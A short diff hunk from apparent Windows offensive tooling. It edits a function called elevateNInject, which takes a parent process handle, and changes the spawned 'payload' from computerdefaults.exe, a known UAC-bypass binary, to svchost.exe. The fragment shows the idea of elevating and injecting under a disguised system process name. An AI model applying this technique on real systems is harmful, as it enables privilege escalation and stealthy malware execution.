@@ -287,7 +287,7 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 	}
 	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
 	si.StartupInfo.wShowWindow = SW_SHOW;
-	wchar_t payload[] = L"C:\\Windows\\System32\\computerdefaults.exe";
+	wchar_t payload[] = L"C:\\Windows\\System32\\svchost.exe";
 	if (!CreateProcess(NULL,
 		payload,
 		NULL,
